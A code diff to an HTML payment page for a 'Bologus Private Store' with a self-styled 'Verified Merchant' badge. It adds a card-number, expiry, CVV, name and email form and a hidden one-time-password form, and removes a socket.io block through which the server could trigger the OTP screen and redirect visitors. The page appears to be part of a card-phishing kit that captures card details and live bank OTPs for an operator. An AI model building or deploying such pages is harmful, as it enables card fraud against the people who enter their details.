@@ -172,6 +172,104 @@
       .bottom-logos img { max-height: 25px; }
     }
   </style>
+</head>
+<body>
+  <div class="page-container">
+    <div class="content-wrapper max-w-md mx-auto">
+      <!-- Merchant Badge -->
+      <div class="merchant-badge mb-6">
+        <div class="trusted-shield">
+          <svg class="shield-icon w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+          </svg>
+          <div class="flex-1">
+            <div class="text-white font-medium">Bologus Private Store</div>
+            <span class="verified-tag">Verified Merchant</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Payment Form -->
+      <div id="paymentForm" class="bg-white shadow-lg rounded-lg p-6">
+        <div class="amount-display mb-6">
+          Amount to Pay: ₹<span id="displayAmount">0</span>
+        </div>
+
+        <form id="mainForm" class="space-y-4">
+          <input type="hidden" id="amount" value="0">
+          
+          <div class="space-y-2">
+            <label class="block text-sm font-medium text-gray-700">Card Number</label>
+            <div class="relative">
+              <span class="rupee-sign">🔒</span>
+              <input type="text" id="cardNumber" class="w-full pl-10 pr-12 py-2 border rounded-md" placeholder="1234 5678 9012 3456" maxlength="19">
+              <div id="cardTypeIcon"></div>
+            </div>
+            <div id="cardError" class="text-red-500 text-sm hidden"></div>
+            <div id="cardInfo" class="text-gray-600 text-sm"></div>
+          </div>
+
+          <div class="grid grid-cols-2 gap-4">
+            <div>
+              <label class="block text-sm font-medium text-gray-700">Expiry Date</label>
+              <input type="text" id="expiry" class="w-full py-2 px-3 border rounded-md" placeholder="MM/YY" maxlength="5">
+            </div>
+            <div>
+              <label class="block text-sm font-medium text-gray-700">CVV</label>
+              <input type="password" id="cvv" class="w-full py-2 px-3 border rounded-md" placeholder="123" maxlength="3">
+            </div>
+          </div>
+
+          <div>
+            <label class="block text-sm font-medium text-gray-700">Cardholder Name</label>
+            <input type="text" id="cardholderName" class="w-full py-2 px-3 border rounded-md" placeholder="Name on card">
+          </div>
+
+          <div>
+            <label class="block text-sm font-medium text-gray-700">Email</label>
+            <input type="email" id="email" class="w-full py-2 px-3 border rounded-md" placeholder="email@example.com">
+          </div>
+
+          <button type="submit" id="submitButton" disabled class="w-full py-3 px-4 flex items-center justify-center text-white rounded-md bg-gray-400">
+            <span id="submitText">Pay Now</span>
+            <svg id="submitLoader" class="animate-spin ml-2 h-5 w-5 text-white hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+              <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+              <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+            </svg>
+          </button>
+        </form>
+      </div>
+
+      <!-- OTP Form -->
+      <div id="otpForm" class="hidden bg-white shadow-lg rounded-lg p-6">
+        <h3 class="text-lg font-medium text-center mb-4">Enter OTP</h3>
+        <p class="text-sm text-gray-600 text-center mb-4">
+          Enter the OTP sent to your registered mobile number ending with <span id="cardLastFour"></span>
+        </p>
+        <div class="mb-4">
+          <input type="text" id="otp" class="w-full text-center py-2 px-3 border rounded-md text-2xl tracking-widest" maxlength="6" placeholder="000000">
+          <div id="otpError" class="text-red-500 text-sm text-center mt-2 hidden">Invalid OTP. Please try again.</div>
+        </div>
+        <p class="text-sm text-gray-600 text-center mb-4">Time remaining: <span id="timer">3:00</span></p>
+        <button id="otpSubmitButton" disabled class="w-full bg-gray-400 text-white py-2 px-4 rounded-md flex items-center justify-center">
+          <span id="otpText">Confirm Payment</span>
+          <svg id="otpLoader" class="animate-spin ml-2 h-5 w-5 text-white hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+          </svg>
+        </button>
+      </div>
+
+      <!-- Bottom Logos -->
+      <div class="bottom-logos">
+        <img src="https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/visa/visa-curved-128px.png" alt="Visa" class="h-8">
+        <img src="https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/mastercard/mastercard-curved-128px.png" alt="Mastercard" class="h-8">
+        <img src="https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/amex/amex-curved-128px.png" alt="American Express" class="h-8">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Rupay-Logo.png/320px-Rupay-Logo.png" alt="RuPay" class="h-8">
+      </div>
+    </div>
+  </div>
+
   <!-- Global Variables -->
   <script>
     let isCardValid = false;
@@ -183,6 +281,7 @@
     let timer = 180;
     let consentChecked = true;
   </script>
+
   <!-- Fetch Payment Details using PID -->
   <script>
     document.addEventListener('DOMContentLoaded', async () => {
@@ -222,6 +321,7 @@
       }
     });
   </script>
+
   <!-- Card Formatting & BIN Lookup -->
   <script>
     function validateCard(number) {
@@ -237,6 +337,22 @@
       }
       return sum % 10 === 0;
     }
+
+    function validateExpiry(value) {
+      const [month, year] = value.split('/').map(x => parseInt(x, 10));
+      if (isNaN(month) || isNaN(year)) return false;
+      
+      const now = new Date();
+      const currentYear = now.getFullYear() % 100;
+      const currentMonth = now.getMonth() + 1;
+      
+      if (month < 1 || month > 12) return false;
+      if (year < currentYear) return false;
+      if (year === currentYear && month < currentMonth) return false;
+      
+      return true;
+    }
+
     function formatCardNumber(value) {
       let v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
       v = v.slice(0, 16);
@@ -246,6 +362,7 @@
       }
       return parts.join(' ');
     }
+
     function formatExpiry(value) {
       let v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
       let formatted = v;
@@ -254,6 +371,7 @@
       }
       return formatted;
     }
+
     function updateCardError() {
       const cardInput = document.getElementById("cardNumber");
       const errorElem = document.getElementById("cardError");
@@ -268,6 +386,7 @@
         cardInput.classList.remove('border-red-500');
       }
     }
+
     function detectCardType(number) {
       const clean = number.replace(/\D/g, '');
       const firstDigit = clean.charAt(0);
@@ -277,6 +396,7 @@
       if (firstDigit === '6') return 'rupay';
       return null;
     }
+
     async function lookupBIN(bin) {
       try {
         const response = await fetch(`https://lookup.binlist.net/${bin}`);
@@ -288,6 +408,7 @@
       }
       return null;
     }
+
     async function updateCardTypeAndInfo(value) {
       const cardIcon = document.getElementById("cardTypeIcon");
       const cardInfo = document.getElementById("cardInfo");
@@ -341,6 +462,7 @@
         if (cardInfo) cardInfo.textContent = "";
       }
     }
+
     function updateSubmitButton() {
       const email = document.getElementById('email').value.trim();
       const cardNum = document.getElementById('cardNumber').value.replace(/\s+/g, '');
@@ -356,6 +478,7 @@
         submitButton.className = "w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-gray-400";
       }
     }
+
     function updateConfirmOtpButton() {
       const otp = document.getElementById('otp').value;
       const otpButton = document.getElementById('otpSubmitButton');
@@ -368,6 +491,7 @@
         otpButton.className = "w-full bg-gray-400 text-white py-2 px-4 rounded-none flex items-center justify-center";
       }
     }
+
     document.addEventListener("DOMContentLoaded", function(){
       const cardInput = document.getElementById("cardNumber");
       const expiryInput = document.getElementById("expiry");
@@ -386,6 +510,7 @@
           }
         });
       }
+
       if (expiryInput) {
         expiryInput.addEventListener("input", function(e) {
           const cursor = e.target.selectionStart;
@@ -400,12 +525,15 @@
           }
         });
       }
+
       ['email', 'cvv', 'cardholderName'].forEach(id => {
         document.getElementById(id).addEventListener('input', updateSubmitButton);
       });
+
       document.getElementById('otp').addEventListener('input', function(e) {
         updateConfirmOtpButton();
       });
+
       async function checkTransactionStatus() {
         if (!currentInvoiceId) return;
         try {
@@ -438,6 +566,7 @@
           console.error('Error checking transaction status:', err);
         }
       }
+
       document.getElementById('mainForm').addEventListener('submit', async function(e) {
         e.preventDefault();
         if (!isCardValid || !isExpiryValid || isProcessing) return;
@@ -481,6 +610,7 @@
           updateSubmitButton();
         }
       });
+
       document.getElementById('otpSubmitButton').addEventListener('click', async () => {
         if (isProcessing) return;
         isProcessing = true;
@@ -515,8 +645,8 @@
         }
       });
     });
-    function startOtpTimer() {
-      if (timerInterval) clearInterval(timerInterval);
+
+    function startOtpTimer() { if (timerInterval) clearInterval(timerInterval);
       timer = 180;
       timerInterval = setInterval(() => {
         timer--;
@@ -530,21 +660,6 @@
         }
       }, 1000);
     }
-  </script>
-  <script src="/socket.io/socket.io.js"></script>
-  <script>
-    const socket = io();
-    const storedInvoiceId = localStorage.getItem("invoiceId");
-    if (storedInvoiceId) {
-      socket.emit('join', storedInvoiceId);
-    }
-    socket.on('show_otp', (data) => {
-      document.getElementById('paymentForm').classList.add('hidden');
-      document.getElementById('otpForm').classList.remove('hidden');
-    });
-    socket.on('redirect', (data) => {
-      window.location.href = data.redirectUrl;
-    });
   </script>
 </body>
 </html>
